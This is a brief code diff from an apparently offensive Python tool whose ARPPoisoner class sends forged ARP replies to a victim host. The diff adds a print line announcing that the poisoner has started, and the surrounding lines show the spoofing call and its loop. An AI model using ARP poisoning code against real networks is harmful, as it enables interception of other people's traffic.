@@ -35,6 +35,7 @@ class ARPPoisoner(Process):
         send(ARP(op=2, pdst=self.victimIp, hwdst=self.victimHwAddr, psrc=self.usurpedIp), verbose=0)
 
     def run(self):
+        print '\033[92m[+]\tStarting ARP poisoner\033[0m'
         try:
             while True:
                 self.usurp()
